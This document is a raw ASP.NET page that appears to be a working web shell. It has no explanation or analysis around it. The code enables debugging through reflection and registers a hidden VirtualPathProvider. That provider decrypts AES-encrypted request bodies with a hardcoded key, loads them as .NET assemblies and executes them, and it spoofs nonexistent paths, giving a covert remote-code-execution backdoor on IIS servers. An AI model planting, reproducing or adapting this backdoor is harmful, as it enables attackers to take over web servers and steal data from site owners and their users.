<%@ Page Language="C#" %> <%@ Import Namespace="System.Diagnostics" %> <%@ Import Namespace="System.IO" %> <%@ Import Namespace="System.Security.Cryptography" %> <%@ Import Namespace="System.Web.Hosting" %> <%@ Import Namespace="System.Reflection" %> <%@ Import Namespace="System.Text" %> <%@ Import Namespace="System.Web" %>  <script runat="server" language="c#"> public void Page_Load() { var t = typeof(System.Web.Compilation.BuildManager); var d = t.GetProperty("DebuggingEnabled", BindingFlags.Static | BindingFlags.NonPublic); if (d != null) { try { d.SetValue(null, true); } catch { } } HostingEnvironment.RegisterVirtualPathProvider(new A()); }  public class A : VirtualPathProvider { public override string GetCacheKey(string v) { try { HttpContext c = HttpContext.Current; if (c != null && c.Request != null && c.Request.Cookies.Count > 0) { Stream s = c.Request.InputStream; if (s.Length > 0) { s.Position = 0; byte[] b = new byte[s.Length]; s.Read(b, 0, b.Length); byte[] k = Encoding.ASCII.GetBytes("ca63457538b9b1e0"); RijndaelManaged r = new RijndaelManaged(); r.KeySize = 128; r.Key = k; r.IV = k; r.Mode = CipherMode.CBC; r.Padding = PaddingMode.PKCS7; ICryptoTransform D = r.CreateDecryptor(r.Key, r.IV); byte[] y; using (MemoryStream m = new MemoryStream(b)) using (CryptoStream S = new CryptoStream(m, D, CryptoStreamMode.Read)) using (MemoryStream p = new MemoryStream()) { S.CopyTo(p); y = p.ToArray(); } Assembly a = Assembly.Load(y); if (a != null) { object i = a.CreateInstance("K"); if (i != null) i.Equals(c); } c.Response.End(); } } } catch {} return Previous.GetCacheKey(v); }  public override bool FileExists(string v) { v = v.ToLower(); if (v.Contains("w")) return true; return Previous.FileExists(v); }  public override VirtualFile GetFile(string v) { v = v.ToLower(); if (v.Contains("w")) return new B(v); return Previous.GetFile(v); } }  public class B : VirtualFile { private string p; public B(string v) : base(v) { p = v; } public override Stream Open() { return new MemoryStream(); } } </script>